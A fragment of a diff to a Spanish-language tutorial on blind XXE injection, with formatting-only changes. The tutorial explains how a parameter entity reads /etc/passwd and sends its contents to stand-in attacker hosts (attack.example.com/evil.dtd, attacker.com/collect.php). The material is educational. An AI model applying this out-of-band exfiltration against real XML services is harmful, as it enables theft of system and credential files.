@@ -99,16 +99,21 @@ Detectar una vulnerabilidad XXE ciega está muy bien, pero en realidad no demues
 El ataque se lleva a cabo de la siguiente manera:
 
 El analizador XML primero procesa la entidad de parámetro %file, que carga el archivo /etc/passwd
-![](6.png)
+
+[](6.png)
+
 Después, se realiza una solicitud al archivo DTD del atacante en http://attack.example.com/evil.dtd
+
 ![](7.png)
 
 Una vez que el analizador XML procesa el archivo DTD del atacante, la entidad de parámetro %all crea una entidad general llamada &send, que contiene la url que incluye el contenido del archivo nombrado anteriormente 
 
 (http://attacker.com/collect.php?collect=root:!:0:0::/:/usr/bin/ksh…)
+
 ![](8.png)
 
 Finalmente, una vez construida la URL, el analizador XML procesa la entidad &send, que realiza una solicitud al servidor del atacante.
+
 ![](9.png)
 
 El atacante puede registrar la solicitud en sus extremos y reconstruir el archivo a partir de la entrada del registro.
